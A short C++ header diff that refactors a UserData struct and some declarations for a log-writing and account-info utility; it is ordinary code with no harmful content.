@@ -10,13 +10,13 @@
 #include "helper.h"
 #include "encrypt.h"
 
-static struct UserData {
-  OSVERSIONINFOEX osVersionInfo;
-  char *accountName;
-  char *computerName;
+struct UserData {
+  OSVERSIONINFOEX osVersionInfo{};
+  char *accountName{};
+  char *computerName{};
   uint32_t activeProcess = 0x0;
 
-} *pUserData;
+};
 
 namespace Stream {
 class LogFile {
@@ -35,8 +35,8 @@ class LogFile {
 std::string GetPath(const std::string &dir = "");
 bool MakeDir(const std::string &path);
 bool MakeFile();
-bool WriteLog(const std::string &input, unsigned int active, bool blockProcessInfo = false);
-void GetAccountInfo(UserData *data);
+bool WriteLog(const std::string &input, uint32_t active, bool blockProcessInfo = false);
+void GetAccountInfo();
 std::vector<std::filesystem::path> GetAllFilesInFolder(const std::string &firstFile);
 
 static Stream::LogFile *logFile;
